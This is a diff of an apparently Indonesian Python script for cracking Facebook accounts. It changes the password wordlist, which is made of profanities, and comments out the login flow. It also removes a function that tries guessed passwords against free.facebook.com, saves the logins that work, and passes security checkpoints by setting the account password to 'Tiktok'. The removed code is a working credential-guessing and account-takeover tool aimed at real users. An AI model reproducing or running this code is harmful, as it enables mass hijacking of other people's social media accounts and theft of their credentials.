@@ -671,7 +671,7 @@ class crackmenu:
                             pws = [ xz[0], xz[0]+'123', xz[0]+'1234',xz[0]+'12345',xz[0]+' '+xz[1]+' '+xz[2]+' '+xz[3]]
                         else:
 				if infox == "Indo":
-                        	    pws = ['bismillah','bajingan','bangsat']
+                        	    pws = ['sayang','anjing','kontol']
 				elif infox == "None":
                         	    pass
 				elif infox == "Bd":
@@ -783,7 +783,6 @@ def method(user, pasw):
 			print("[\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
 		if len(ngew) == 0:
 			print("\n\033[0;96m\033[0;97m[\033[1;32m➤\033[1;37m] Status: \033[1;32mOne Tap Yes / SuccessFul To Login")
-			eksekusi(user,pasw)
 			ppx=open("Cracked/Tap_Yes.txt", "a+")
 			ppx.write(user+" | "+pasw+"\n")
 			ppx.close()
@@ -842,90 +841,16 @@ def user_id():
 	raw_input("\nBack To Menu")
 	cracking_menu()
 
-url="https://free.facebook.com"
-newpass="Tiktok"
-def eksekusi(username,password):
-        useragent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
-        try:
-                respons=login_ris(username,password)
-        except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
-                eksekusi(username,password)
-        session=respons[0]
-        if "c_user" in session.cookies.get_dict():
-                print(i+"Login Sukses "+c+"⟩⟩"+i+" {}|{}".format(username,password))
-                open("Cracked/ok.txt","a+").write("{}|{}\n".format(username,password))
-        elif "checkpoint" in session.cookies.get_dict():
-                session.headers.update({"Host":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1).split("//")[1],"referer":re.search("(https://.*?\.facebook.com)",respons[1].url).group(1)+"/checkpoint/"})
-                respon=tahap1(session,parser(respons[1].text))
-                if respon == "new password":
-                        print(i+"Suksess Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,newpass))
-                        open("Cracked/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
-                elif respon == "no change password":
-                        print(i+"Failed Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,password))
-                        open("Cracked/no_change.txt","a+").write("{}|{}\n".format(username,password))
-                else:
-                        print(k+"CheckPoints "+c+"⟩⟩ {}{}|{}".format(p,username,password))
-                        if username not in open("Cracked/cp.txt").read():
-                                open("Cracked/cp.txt","a+").write("{}|{}\n".format(username,password))
-        else:
-                print(m+"Login Failed "+c+"⟩⟩"+m+" {}|{}".format(username,password))
-
-def login_ris(username,password,**kwargs):
-        session=requests.session()
-        parsing=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text)
-        kwargs=get_data(parsing,"sign_up")
-        kwargs.update({"email":username,"pass":password})
-        if '_fb_noscript' in kwargs:
-                del kwargs['_fb_noscript']
-        session.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":useragent,"content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url})
-        respon=session.post(url+get_action(parsing),data=kwargs)
-        return session,respon
-
-def tahap1(session,parsing):
-        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
-        if "submit[Yes]" in kwargs:
-                del kwargs["submit[No]"]
-                try:
-                        respon=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs).text
-                except requests.exceptions.TooManyRedirects:
-                        respon="kontol"
-                if "password_new" in respon or "buat kata sandi baru" in respon.lower():
-                        return tahap2(session,parser(respon))
-                if "c_user" in session.cookies.get_dict():
-                        return "no change password"
-
-def tahap2(session,parsing):
-        kwargs=get_data(parsing,"submit[logout-button-with-confirm]")
-        kwargs.update({"password_new":newpass})
-        respons=session.post(session.headers["referer"].split("/checkpoint/")[0]+get_action(parsing),data=kwargs,allow_redirects=False)
-        if "c_user" in respons.cookies.get_dict():
-                return "new password"
-
-def get_data(parsing,kecuali,**kwargs):
-        for lnput in parsing.find_all("input",{"name":True,"value":True}):
-                if kecuali in lnput["name"]: continue
-                else: kwargs.update({lnput["name"]:lnput["value"]})
-        return kwargs
-
-def get_action(parsing):
-        return parsing.find("form",{"method":"post"})["action"]
-
-def parser(html):
-        return BeautifulSoup(html,"html.parser")
-
-def ngetik(kata,jum=0.002):
-        for x in kata + "\n":
-                sys.stdout.write(x)
-                sys.stdout.flush()
-                sleep(jum)
 # Enc Lain2
 if __name__ == '__main__':
 	os.system('git pull')
 	main_check()
 	try:
-		main_check()
-		pilih_pw()
-		login()
+#		main_check()
+#		pilih_pw()
+#		login()
+		rnn = str(random.randint(1111111, 9999999))
+		print "10000000"+rnn
 	except Exception as e:
 		print(("  [+] Error : %s"%e)),;time.sleep(1)
 		exit()
